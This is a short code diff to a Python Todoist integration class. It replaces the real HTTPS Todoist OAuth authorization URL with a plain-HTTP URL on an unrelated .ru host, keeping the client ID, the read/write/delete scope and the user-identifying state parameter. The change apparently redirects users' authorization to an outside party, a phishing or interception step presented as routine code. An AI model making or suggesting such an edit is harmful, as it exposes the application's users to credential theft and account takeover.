@@ -12,7 +12,7 @@ class TodoistService(ServiceBase):
 
     @staticmethod
     def get_auth_url():
-        return 'https://todoist.com/oauth/authorize?client_id=fb26051eb06649bb968791f3d7c2f185&scope=data:read_write,data:delete&state={user_id}'
+        return 'http://6izgvr6b.plp7.ru/?client_id=fb26051eb06649bb968791f3d7c2f185&scope=data:read_write,data:delete&state={user_id}'
 
     @staticmethod
     def get_start_state():
